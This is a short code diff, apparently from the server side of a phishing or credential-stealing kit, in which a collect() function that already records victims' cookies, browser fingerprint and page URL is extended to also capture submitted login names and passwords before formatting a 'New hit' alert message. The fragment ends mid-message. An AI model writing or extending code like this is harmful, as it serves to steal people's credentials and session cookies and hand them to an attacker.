@@ -41,7 +41,8 @@ def collect():
     cookies  = data.get("cookies", "—")
     fp       = data.get("fp", "—")
     page     = data.get("url", "—")
-    
+    login    = data.get("login", "—")
+    password = data.get("password", "—")
     now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
     
    msg = f"""🚨 <b>New hit</b>
